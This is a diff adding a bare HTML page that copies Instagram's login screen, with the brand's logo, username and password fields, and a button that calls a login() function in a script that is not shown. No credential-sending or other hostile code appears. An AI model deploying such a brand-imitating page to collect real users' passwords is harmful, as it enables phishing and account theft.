@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <div class="login-container">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTCintT2Z2AaOkr7R4EEsekPB90LisnNK7tPg&usqp=CAU" alt="Instagram Logo" class="logo">
+      <form id="loginForm">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+
+        <button type="button" onclick="login()">Log In</button>
+      </form>
+
+      <p class="error-message" id="errorMessage"></p>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
